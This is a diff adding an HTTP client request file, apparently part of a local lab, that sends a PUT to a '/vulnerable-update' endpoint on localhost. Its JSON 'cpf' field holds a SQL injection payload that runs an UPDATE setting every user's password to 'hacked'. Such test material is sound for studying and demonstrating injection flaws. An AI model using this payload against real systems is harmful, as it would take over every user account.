@@ -1,0 +1,18 @@
+meta {
+  name: /vulnerable-update
+  type: http
+  seq: 7
+}
+
+put {
+  url: http://localhost:3000/vulnerable-update
+  body: json
+  auth: inherit
+}
+
+body:json {
+  {
+    "cpf": "12345678900'; UPDATE users SET password='hacked' WHERE '1'='1' --",
+    "newPassword": "hacked"
+  }
+}
